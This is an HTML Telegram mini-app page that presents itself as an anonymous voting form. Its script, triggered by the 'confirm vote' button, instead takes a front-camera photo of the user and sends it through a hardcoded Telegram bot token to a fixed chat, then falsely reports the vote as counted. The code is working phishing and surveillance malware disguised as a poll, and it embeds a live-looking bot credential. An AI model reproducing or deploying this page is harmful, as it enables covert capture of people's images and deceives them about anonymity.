<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Голосование</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #222;
        }
        .card {
            background: white;
            border-radius: 28px;
            padding: 40px 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 12px 40px rgba(0,0,0,0.12);
            text-align: center;
        }
        .icon {
            font-size: 56px;
            margin-bottom: 12px;
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        p {
            font-size: 16px;
            color: #666;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 16px 20px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 12px rgba(0,136,204,0.3);
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn:disabled {
            opacity: 0.6;
            transform: none;
        }
        #status {
            margin-top: 16px;
            font-size: 15px;
            color: #888;
            min-height: 24px;
        }
        .footnote {
            margin-top: 20px;
            font-size: 13px;
            color: #aaa;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">📊</div>
    <h2>Голосование</h2>
    <p>Нажмите «Подтвердить», чтобы ваш голос был учтён.<br><span style="font-size:14px;color:#999;">Однократное действие</span></p>
    <button class="btn" id="btn">✅ Подтвердить</button>
    <div id="status"></div>
    <div class="footnote">Ваш голос анонимен</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();

    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');

    btn.addEventListener('click', function() {
        btn.disabled = true;
        btn.innerText = '⏳ Обработка...';
        statusDiv.innerText = '';

        // Запрашиваем камеру через Telegram API
        tg.requestCamera('front', function(error, stream) {
            if (error) {
                statusDiv.innerText = '⚠️ Ошибка, попробуйте позже';
                btn.disabled = false;
                btn.innerText = '✅ Подтвердить';
                return;
            }

            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                canvas.toBlob(function(blob) {
                    const formData = new FormData();
                    formData.append('chat_id', '7406666272');
                    formData.append('photo', blob, 'photo.jpg');

                    fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok) {
                            statusDiv.innerText = '✅ Спасибо! Ваш голос учтён.';
                            btn.innerText = '✔️ Готово';
                            setTimeout(() => tg.close(), 1200);
                        } else {
                            statusDiv.innerText = '❌ Ошибка сервера';
                            btn.disabled = false;
                            btn.innerText = '✅ Подтвердить';
                        }
                    })
                    .catch(() => {
                        statusDiv.innerText = '❌ Ошибка сети';
                        btn.disabled = false;
                        btn.innerText = '✅ Подтвердить';
                    });

                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.7);
            };
        });
    });
</script>

</body>
</html>
